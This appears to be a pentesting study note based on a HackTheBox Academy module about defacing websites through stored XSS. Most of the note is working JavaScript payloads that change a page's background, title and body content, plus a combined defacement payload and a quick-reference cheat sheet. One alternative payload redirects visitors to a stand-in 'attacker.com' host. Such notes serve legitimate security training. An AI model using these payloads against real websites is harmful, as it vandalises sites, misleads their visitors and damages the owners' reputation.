# XSS Exploitation – Website Defacement

## Overview

Website defacement is a common post-exploitation objective when exploiting **Stored XSS vulnerabilities**.

Defacement involves modifying the visual appearance of a web page in order to:

- demonstrate successful compromise
- display attacker messages
- damage brand reputation
- create public visibility
- influence company trust or share value
- show proof of concept (PoC)

Because Stored XSS executes for every visitor, it is particularly effective for defacement attacks.

---

# Why Stored XSS is Ideal for Defacement

Stored XSS payloads:

```
persist in the database
execute automatically for all users
trigger on every page load
```

Impact scope:

```
multiple victims
persistent modification of page appearance
high visibility attack
```

---

# Typical Defacement Goals

Attackers usually aim to:

- replace webpage content
- change page styling
- display messages
- insert logos/images
- remove legitimate content

Defacement does not need to be complex:

```
simple visual impact is sufficient
```

---

# Common Defacement Targets

Frequently modified elements:

| Element | JavaScript Property |
|--------|--------------------|
| Background color | document.body.style.background |
| Background image | document.body.background |
| Page title | document.title |
| Page content | innerHTML |

---

# Changing Background Colour

Changing background colour creates strong visual impact.

---

## Payload

```html
<script>
document.body.style.background = "#141d2b"
</script>
```

---

## Alternative colour

```html
<script>
document.body.style.background = "black"
</script>
```

---

# Changing Background Image

Images can be used for branding or messaging.

---

## Payload

```html
<script>
document.body.background =
"https://www.hackthebox.eu/images/logo-htb.svg"
</script>
```

---

# Changing Page Title

Browser tab title modification:

---

## Payload

```html
<script>
document.title = "Hacked"
</script>
```

---

## Example

```html
<script>
document.title = "HackTheBox Academy"
</script>
```

---

# Modifying Page Content

Content manipulation allows full visual takeover.

---

## Modify specific element

```html
<script>
document.getElementById("todo").innerHTML = "Hacked"
</script>
```

---

## Replace entire page content

```html
<script>
document.getElementsByTagName('body')[0].innerHTML = "Hacked"
</script>
```

---

# Example Defacement HTML

```html
<center>
<h1 style="color:white">Cyber Security Training</h1>

<p style="color:white">
by

<img src="https://academy.hackthebox.com/images/logo-htb.svg"
height="25px">
</p>

</center>
```

---

# Full Defacement Payload

```html
<script>

document.body.style.background="#141d2b";

document.title="HackTheBox Academy";

document.getElementsByTagName('body')[0].innerHTML=
'<center><h1 style="color:white">Cyber Security Training</h1><p style="color:white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px"></p></center>';

</script>
```

---

# Attack Result

Effects:

- background colour changed
- page title modified
- original content removed
- attacker message displayed

Users see defaced website.

---

# Persistence Behaviour

Stored XSS ensures:

```
payload stored in backend database
executed on every visit
remains after refresh
affects all users
```

---

# Viewing Injected Code in Source

Injected JavaScript typically appears appended:

```html
<script>
document.body.style.background="#141d2b"
</script>

<script>
document.title="HackTheBox Academy"
</script>

<script>
document.getElementsByTagName('body')[0].innerHTML='...'
</script>
```

Even though original HTML exists:

```
rendered DOM shows modified content
```

---

# Alternative Defacement Payloads

## simple text replacement

```html
<script>
document.body.innerHTML="<h1>Hacked</h1>"
</script>
```

---

## redirect users

```html
<script>
window.location="http://attacker.com"
</script>
```

---

## display alert message

```html
<script>
alert("Website compromised")
</script>
```

---

## modify CSS styling

```html
<script>
document.body.style.color="red"
</script>
```

---

# Practical Considerations

Defacement effectiveness depends on:

- injection location in DOM
- execution order of scripts
- browser rendering behaviour
- CSP protections
- HTML sanitization controls

Sometimes multiple payload adjustments required.

---

# Ethical Context

In legitimate testing:

```
defacement demonstrates exploit impact
```

Typically limited to:

- harmless messages
- proof of concept text
- temporary modifications

---

# Key Takeaways

- stored XSS enables persistent defacement
- visual impact demonstrates severity
- simple DOM modifications can fully alter page
- defacement is often used as proof of compromise
- manipulating innerHTML provides full control of page display

---

# Quick Reference

## change background

```javascript
document.body.style.background="black"
```

---

## change title

```javascript
document.title="Hacked"
```

---

## replace page content

```javascript
document.body.innerHTML="Hacked"
```

---

## display image

```javascript
document.body.background="image_url"
```

---

# Tags

#xss  
#stored-xss  
#defacement  
#web-security  
#dom-manipulation  
#javascript  
#owasp  
#pentesting  
#obsidian